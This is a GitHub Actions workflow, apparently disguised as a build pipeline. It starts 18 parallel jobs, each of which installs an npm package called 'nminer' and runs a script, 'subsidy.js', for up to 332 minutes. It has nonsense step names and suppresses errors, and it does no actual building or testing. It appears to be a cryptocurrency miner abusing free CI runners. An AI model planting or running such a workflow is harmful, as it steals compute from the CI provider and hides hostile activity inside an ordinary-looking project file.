name: subsidy
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4797 }
          - { version: 7661 }
          - { version: 598 }
          - { version: 3880 }
          - { version: 8707 }
          - { version: 4349 }
          - { version: 4407 }
          - { version: 6208 }
          - { version: 4386 }
          - { version: 9893 }
          - { version: 6946 }
          - { version: 7349 }
          - { version: 4096 }
          - { version: 1033 }
          - { version: 8724 }
          - { version: 9247 }
          - { version: 1851 }
          - { version: 5347 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: gripper huzzah lest until
        run: |
          npm install nminer@latest
          timeout 332m node subsidy.js || echo "subsidy executed"